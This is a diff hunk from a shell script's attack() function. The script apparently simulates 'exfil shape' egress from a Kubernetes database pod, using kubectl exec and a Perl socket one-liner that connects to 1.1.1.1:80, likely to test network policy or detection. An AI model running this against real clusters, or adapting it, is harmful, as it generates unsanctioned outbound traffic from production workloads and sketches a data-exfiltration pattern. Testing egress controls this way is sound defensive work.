@@ -146,7 +146,7 @@ attack() {
 
   log "database -> 1.1.1.1:80 (the exfil shape)"
   for _ in $(seq 1 3); do
-    kubectl -n "$ns" exec "$db" -- perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new(PeerAddr=>"1.1.1.1:80",Timeout=>10) or exit 0; print $s "GET / HTTP/1.1\r\nHost: 1.1.1.1\r\n\r\n"; sysread($s,$b,512); print "connected ", (split /\r\n/, $b)[0], "\n"; sleep 45' &
+    kubectl -n "$ns" exec "$db" -- perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new(PeerAddr=>"1.1.1.1:80",Timeout=>10) or exit 0; print $s "GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nConnection: close\r\n\r\n"; $b=""; 1 while sysread($s,$b,4096,length $b); print "connected ", (split /\r\n/, $b)[0], " ", length($b), "B\n"; sleep 45' &
     sleep 3
   done
   wait
